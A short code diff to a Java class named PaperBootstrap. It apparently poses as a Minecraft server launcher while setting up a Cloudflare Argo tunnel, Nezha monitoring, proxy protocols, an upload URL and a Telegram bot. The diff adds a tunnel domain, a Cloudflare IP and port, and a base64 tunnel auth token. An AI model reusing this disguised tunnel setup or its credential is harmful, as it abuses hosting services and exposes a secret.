@@ -92,23 +92,23 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "ddba4aa1-15a7-4543-b8e4-36086770350e");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "creepercloud-de.dogchild.eu.org");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZDFhMjdhMjZmN2YwNDE0MjU5ZTdjODdiZDQ1MmYxMTkiLCJ0IjoiNGE0YTg2Y2ItZGM2MS00Yzc1LTkwYTQtMDgwNWZlNDFiYmY4IiwicyI6IlpUazROR0l6TnprdFlUUmtOQzAwTXprMkxUZ3daamt0T0RNNFlqZzBZalZsTlRBNSJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
+        envVars.put("CFIP", "cf.877774.xyz");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "creepercloud");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
